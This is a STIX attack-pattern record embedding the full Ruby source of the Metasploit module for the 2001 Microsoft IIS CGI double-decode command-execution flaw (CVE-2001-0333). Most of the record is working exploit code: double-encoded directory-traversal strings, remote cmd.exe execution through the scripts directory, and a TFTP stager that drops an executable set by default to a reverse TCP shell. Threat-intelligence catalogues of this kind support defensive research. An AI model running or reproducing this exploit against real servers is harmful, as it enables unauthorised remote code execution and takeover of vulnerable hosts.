{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--69937ab7-6efb-4792-9dda-668205e73566",
    "created": "2024-08-14T16:48:36.315943Z",
    "modified": "2024-08-14T16:48:36.315947Z",
    "name": "MS01-026 Microsoft IIS/PWS CGI Filename Double Decode Command Execution",
    "description": " This module will execute an arbitrary payload on a Microsoft IIS installation that is vulnerable to the CGI double-decode vulnerability of 2001.  This module has been tested successfully on:  Windows 2000 Professional (SP0) (EN); Windows 2000 Professional (SP1) (AR); Windows 2000 Professional (SP1) (CZ); Windows 2000 Server (SP0) (FR); Windows 2000 Server (SP1) (EN); and Windows 2000 Server (SP1) (SE).  Note: This module will leave a Metasploit payload exe in the IIS scripts directory. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/iis/ms01_026_dbldecode.rb",
            "external_id": "ms01_026_dbldecode.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-0333"
        },
        {
            "source_name": "reference",
            "url": "http://marc.info/?l=bugtraq&m=98992056521300&w=2"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MS01-026 Microsoft IIS/PWS CGI Filename Double Decode Command Execution',\n        'Description' => %q{\n          This module will execute an arbitrary payload on a Microsoft IIS installation\n          that is vulnerable to the CGI double-decode vulnerability of 2001.\n\n          This module has been tested successfully on:\n\n          Windows 2000 Professional (SP0) (EN);\n          Windows 2000 Professional (SP1) (AR);\n          Windows 2000 Professional (SP1) (CZ);\n          Windows 2000 Server (SP0) (FR);\n          Windows 2000 Server (SP1) (EN); and\n          Windows 2000 Server (SP1) (SE).\n\n          Note: This module will leave a Metasploit payload exe in the IIS scripts directory.\n        },\n        'Author' => [ 'jduck' ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2001-0333' ],\n          [ 'OSVDB', '556' ],\n          [ 'BID', '2708' ],\n          [ 'MSB', 'MS01-026' ],\n          [ 'URL', 'http://marc.info/?l=bugtraq&m=98992056521300&w=2' ]\n        ],\n        'Platform' => 'win',\n        'Targets' => [\n          [\n            'Windows (Dropper)',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86],\n              'DefaultOptions' => { 'PAYLOAD' => 'windows/shell/reverse_tcp' },\n              'Type' => :win_dropper\n            }\n          ],\n          [\n            'Windows (Command)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/generic' },\n              'Type' => :win_command\n            }\n          ]\n        ],\n        'CmdStagerFlavor' => 'tftp',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]\n        },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2001-05-15'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('WINDIR', [ false, 'The Windows directory name of the target host', nil ]),\n        OptInt.new('DEPTH', [ true, 'Traversal depth to reach the drive root', 2 ])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def dotdotslash\n    [\n      '..%255c',\n      '..%%35c',\n      '..%%35%63',\n      '..%25%35%63',\n      '.%252e/',\n      '%252e./',\n      '%%32%65./',\n      '.%%32%65/',\n      '.%25%32%65/',\n      '%25%32%65./'\n    ].sample\n  end\n\n  # Detect the correct Windows directory name.\n  # Unfortunately, the IIS scripts directory must\n  # be located on the same drive as %SystemRoot%.\n  def detect_windows_directory\n    win_dirs = %w[winnt windows]\n    matches = [\n      'Directory of',\n      '\\\\inetpub\\\\',\n      \"\\\\scripts\\r\\n\"\n    ]\n\n    win_dirs.each do |dir|\n      res = execute_command('dir', windir: dir)\n      next unless res\n      next unless res.code == 200\n      next unless res.body\n\n      matches.each do |m|\n        return dir if res.body.to_s.include?(m)\n      end\n    end\n\n    nil\n  end\n\n  def check\n    win_dir = detect_windows_directory\n    win_dir ? CheckCode::Vulnerable(\"Found Windows directory name: #{win_dir}\") : CheckCode::Safe\n  end\n\n  def execute_command(cmd, opts = {})\n    # Don't run the start command...\n    # We'll execute the payload via IIS later.\n    # Using the \"start\" method doesn't seem to make IIS very happy :(\n    return if cmd.start_with?('start') && cmd.include?('.exe')\n\n    vprint_status(\"Executing command: #{cmd}\")\n    if opts[:cgifname]\n      cmd_path = opts[:cgifname]\n    else\n      cmd_path = ''\n      datastore['DEPTH'].times { cmd_path << dotdotslash }\n      cmd_path << (opts[:windir] || @win_dir)\n      cmd_path << '/system32/cmd.exe'\n    end\n    uri = \"/scripts/#{cmd_path}?/x+/c+#{Rex::Text.uri_encode(cmd)}\"\n    send_request_cgi({ 'uri' => uri }, 20)\n  end\n\n  def copy_cmd_exe_to_scripts_directory\n    fname = \"#{rand_text_alphanumeric(4..7)}.exe\"\n    print_status(\"Copying \\\"\\\\#{@win_dir}\\\\system32\\\\cmd.exe\\\" to the IIS scripts directory as \\\"#{fname}\\\"...\")\n    res = execute_command(\"copy \\\\#{@win_dir}\\\\system32\\\\cmd.exe #{fname}\")\n    fail_with(Failure::Unknown, 'No reply from server') unless res\n    fname\n  end\n\n  def exploit\n    @win_dir = datastore['WINDIR'] || detect_windows_directory\n\n    fail_with(Failure::NotVulnerable, 'Unable to detect the target host Windows directory (maybe not vulnerable)!') unless @win_dir\n\n    print_status(\"Using Windows directory \\\"#{@win_dir}\\\"\")\n\n    @cmd_exe_fname = copy_cmd_exe_to_scripts_directory\n\n    case target['Type']\n    when :win_command\n      res = execute_command(payload.encoded, cgifname: @cmd_exe_fname)\n\n      if res && res.body\n        cmd_res = res.code == 200 ? res.body : res.body.to_s.scan(%r{<pre>(.*?)</pre>}m).flatten.first.to_s\n        if cmd_res.strip.blank?\n          print_status('Command returned no output')\n        else\n          print_good('Command output:')\n          print_line(cmd_res)\n        end\n      else\n        print_error('No reply')\n      end\n    when :win_dropper\n      tftphost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n      execute_cmdstager(\n        temp: '.',\n        linemax: 1_400,\n        cgifname: @cmd_exe_fname,\n        tftphost: tftphost,\n        # Force noconcat so we can skip the \"start\" command in execute_command method\n        noconcat: true,\n        # We can't delete the payload while it is running, so don't try\n        nodelete: true\n      )\n\n      exe_payload = stager_instance.payload_exe\n      register_file_for_cleanup(exe_payload)\n\n      print_status(\"Triggering payload \\\"#{exe_payload}\\\" via a direct request...\")\n      send_request_cgi({ 'uri' => \"/scripts/#{exe_payload}\" }, 1)\n    end\n  end\n\n  # Remove the copied cmd.exe from the IIS scripts directory\n  def cleanup\n    execute_command(\"del #{@cmd_exe_fname}\") if @cmd_exe_fname\n  ensure\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2001-05-15",
    "x_mitre_platforms": [
        "win'"
    ]
}